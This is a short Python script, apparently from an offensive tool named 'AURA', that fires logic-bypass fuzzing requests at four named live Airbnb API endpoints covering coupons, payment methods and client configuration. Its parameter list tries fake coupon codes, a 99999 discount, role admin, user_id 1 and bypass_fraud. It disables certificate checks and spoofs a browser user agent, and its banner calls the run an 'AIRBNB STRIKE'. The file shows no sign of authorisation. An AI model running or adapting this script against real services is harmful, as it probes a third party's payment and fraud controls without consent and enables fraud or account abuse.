import asyncio
import httpx
import json
from aura.ui.formatter import console

# Targeted Endpoints from Recon
ENDPOINTS = [
    "https://www.airbnb.com/api/v2/get-data-layer-variables",
    "https://www.airbnb.com/api/queries/CouponPromotionQuery",
    "https://www.airbnb.com/api/queries/PaymentMethodsBootstrapData",
    "https://www.airbnb.com/api/v2/client_configs"
]

# Common Logic Bypass / Manipulation Parameters
FUZZ_PARAMS = [
    {"coupon_code": "TEST100"},
    {"coupon_code": "ADMIN_FREE"},
    {"discount_amount": 99999},
    {"is_internal": True},
    {"debug": "true"},
    {"role": "admin"},
    {"user_id": 1},
    {"bypass_fraud": "true"}
]

async def fuzz_endpoint(client, url):
    console.print(f"[*] Fuzzing Endpoint: {url}")
    for param in FUZZ_PARAMS:
        try:
            # Try GET
            r_get = await client.get(url, params=param, timeout=10)
            if r_get.status_code == 200 and len(r_get.text) > 100:
                 console.print(f"  [green][+] Potential Hit (GET): {param} -> {r_get.status_code}[/green]")
            
            # Try POST
            r_post = await client.post(url, json=param, timeout=10)
            if r_post.status_code == 200:
                 console.print(f"  [green][+] Potential Hit (POST): {param} -> {r_post.status_code}[/green]")
                 
        except Exception as e:
            pass

async def main():
    console.print("[bold red]💀 AURA LOGIC FUZZ: AIRBNB STRIKE[/bold red]")
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json"
    }
    
    async with httpx.AsyncClient(headers=headers, verify=False, follow_redirects=True) as client:
        tasks = [fuzz_endpoint(client, url) for url in ENDPOINTS]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
